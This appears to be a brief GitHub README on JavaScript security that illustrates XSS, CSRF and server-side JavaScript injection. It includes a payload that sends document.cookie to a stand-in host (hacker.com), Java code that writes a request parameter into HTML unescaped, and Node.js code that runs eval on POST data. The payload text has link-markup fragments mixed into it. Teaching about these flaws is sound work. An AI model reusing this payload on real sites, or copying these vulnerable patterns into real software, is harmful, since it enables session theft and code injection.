# Java-Script
Java Script Security Best Practices

1. Cross-Site Scripting (XSS)
This HTML code can be used by hacker for utilizing malicious data. This code can be used without validation or escaping.
It will allow transferring of victim’s session ID to hacker’s site and therefore it can be misused as hackers gain access to it.

(String) page += ”
<input name=’myaccountname’
type=’TEXT’ value='” +
request.getParameter(“FF”) + “‘>”;

The eve-dropper changes the ‘FF’ parameter in their browser to:
<script>document.location=
‘<a class="vglnk" href="http://www.hacker.com/" rel="nofollow"><span>http</span><span>://</span><span>www</span><span>.</span><span>hacker</span><span>.</span><span>com</span><span>/</span></a>
cgi-bin
/cookie.cgi?param=’
+document.cookie</script>’.

2. Cross-Site Request Forgery (CSRF)
This application will permit the user to send a state-changing request.
Thus, eve-dropper develops a request for enabling money transfer from a victim’s account to that of eve-dropper’s.

![1 2](https://user-images.githubusercontent.com/50174329/80175929-b1486100-8614-11ea-8e2e-bfeb789d9acd.PNG)

3. Server-Side Javascript Injection (SSJI)

var http = require('http');
http.createServer(function (request, response) {
  if (request.method === 'POST') {
    var data = '';
    request.addListener('data', function(chunk) { data += chunk; });
    request.addListener('end', function() {
      var bankData = eval("(" + data + ")");
      bankQuery(bankData.balance);
   });
  }
});
